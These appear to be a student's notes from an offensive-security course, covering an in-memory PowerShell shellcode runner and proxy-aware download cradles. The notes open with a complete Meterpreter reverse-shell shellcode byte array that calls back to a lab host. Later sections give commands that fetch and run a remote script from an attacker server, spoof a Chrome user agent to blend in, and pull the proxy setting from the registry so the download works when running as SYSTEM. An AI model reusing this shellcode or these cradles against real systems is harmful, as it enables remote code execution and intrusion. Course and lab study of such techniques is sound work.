[Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x89,0xe5,0x8b,0x52,0x14,0xf,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x49,0x31,0xff,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xc1,0xcf,0xd,0xac,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x78,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x32,0x5f,0x30,0x5f,0x31,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x39,0x35,0x2e,0x30,0x2e,0x34,0x36,0x33,0x38,0x2e,0x36,0x39,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xbb,0x1,0x0,0x0,0xe8,0xbe,0x0,0x0,0x0,0x2f,0x53,0x63,0x4c,0x71,0x4a,0x5a,0x37,0x6c,0x75,0x71,0x69,0x6d,0x76,0x36,0x65,0x2d,0x78,0x41,0x4b,0x66,0x63,0x51,0x35,0x65,0x41,0x49,0x51,0x30,0x50,0x63,0x69,0x52,0x48,0x52,0x36,0x6a,0x73,0x44,0x58,0x34,0x49,0x78,0x54,0x75,0x70,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x47,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x30,0x2e,0x31,0x30,0x2e,0x36,0x2e,0x31,0x32,0x0,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5
```

got  areverse shell however caught by antivirus.

### 3.6.4.1 Exercises
1. Generate a Meterpreter shellcode and obtain an in-memory PowerShell shellcode runner 
resulting in a reverse shell.

    done above

2. The code developed in this section was based on a 32-bit PowerShell process. Identify and 
modify needed elements to make this work from a 64-bit PowerShell process.

# Talking to proxy

Its essential to bypass proxy at the other end

then powershlle canbe download through: 

```ps1
$wc = new-object system.net.WebClient
$wc.DownloadString("http://10.10.6.12/run.ps1")
```

Running a proxy 
    To set up the proxy on our machine, we’ll right-click on the Windows Start icon and navigate to 
    Settings > Network & Internet > Proxy, and scroll down to “Manual proxy setup”.
    We’ll enable the proxy server and enter the IP address of the Windows 10 development client 
    (192.168.120.12 in our case) and the static TCP port 3128. Finally, we’ll click Save and close the 
    settings menu.

Proxy ccan be verified by :

`PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> 
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://10.10.6.12/run.ps1")`

since proxy is autmatically handled:

```ps1
$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

### 3.7.1.1 Exercises
1. Setup the proxy configuration and verify whether or not the Net.WebClient download cradle 
is proxy-aware.
2. Are other PowerShell download cradles proxy aware?

# Fiddling with User agent

You can add user aagent in the webclient object

```ps1
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

### 3.7.2.1 Exercises
1. Set a custom User-Agent in the download cradle and observe it in the Apache access logs.
2. Instead of a custom User-Agent string, identify one used by Google Chrome and implement 
that in the download cradle

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
```

# Give me system proxy

when using an elevated powershell it is necessatry that we have a systme proxy

```
C:\Tools\Sysinternals> PsExec.exe -s -i 
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
```

we need to create a system wide rproxy this can be started from using registry hive

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`

When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the 
user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
However, the HKEY_USERS registry hive always exists and contains the content of all user 
HKEY_CURRENT_USER registry hives split by their respective SIDs.

As part of our download cradle, we can use PowerShell to resolve a registry key. But the 
HKEY_USERS registry hive is not automatically mapped. Nevertheless, we can map it with the 
New-PSDrive185 commandlet by specifying a name, the PSProvider as “Registry”, and Root as 
“HKEY_USERS”.
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
Listing 110 - Mapping HKEY_USERS registry hive with PowerShell
While we can now interact with and query the HKEY_USERS hive, we must decide which user’s 
hive we want to copy. The HKEY_USERS hive contains the hives of all users on the computer, 
including SYSTEM and other local service accounts, which we want to avoid.
The registry hives are divided and named after the SIDs of existing users and there is a specific 
pattern. Any SID starting with “S-1-5-21-” is a user account exclusive of built-in accounts.186
To obtain a valid user hive, we can loop through all top level entries of the HKEY_USERS until we 
find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving 
only the SID, while omitting the HKEY_USERS string.
We can find all the top-level HKEY_USERS with the Get-ChildItem187 cmdlet and use a ForEach
loop to find the first that contains a SID starting with “S-1-5-21-”.
Once we find the first record, we’ll save it in the $start variable and exit the loop through the 
break188 statement as displayed in Listing 111.

```ps1
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}}
```

Listing 111 - Finding a user hive based on SID
To fetch the content of the registry key, we’ll use the Get-ItemProperty189 cmdlet as shown in 
Listing 112.
Get-ItemProperty accepts the path (-Path) for the registry key, but since we manually mapped the 
HKEY_USERS registry hive, we must specify it before the registry path and key we desire, 
eliminating the need to specify the “HKEY_USERS” string.

``` ps1
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

The code shown above gathers the proxy server IP address and network port from the registry 
and assigns it to the $proxyAddr variable. Now we must turn the contents of the variable into a 
proxy object that we can assign to our Net.WebClient object.
To do this, we’ll create a new object from the WebProxy190 class and assign it as the 
DefaultWebProxy that is built into all Net.WebClient objects. The constructor takes one argument, 
which is the URL and port of the proxy server, i.e.: the value we have just resolved from the 
registry.

```ps1
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object 
System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run.ps1")11111
```


Now we have all the pieces needed to create a proxy-aware PowerShell download cradle running 
in SYSTEM integrity. Let’s assemble all the code segments into the code shown in Listing 114.

FINAL CODE of the section:

```ps1
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object 
System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")

````

Listing 114 - Full code for SYSTEM integrity proxy aware download cradle
Notice that we have changed the name of the PowerShell shellcode runner script from run.ps1 to 
run2.ps1 in the last line of the script since PowerShell may cache the file and affect our results.
When running the complete code, be aware that mapping HKEY_USERS will 
persist across reruns of the code so the PowerShell_ISE prompt must be closed 
for the full code to run if previous incremental steps have been executed.
Before executing the updated PowerShell script, we’ll make a copy of the run2.ps1 PowerShell 
shellcode runner in the Kali web root

3.7.3.1 Exercise
1. Recreate the steps in this section to obtain a HTTP request through the proxy.
need ti do







































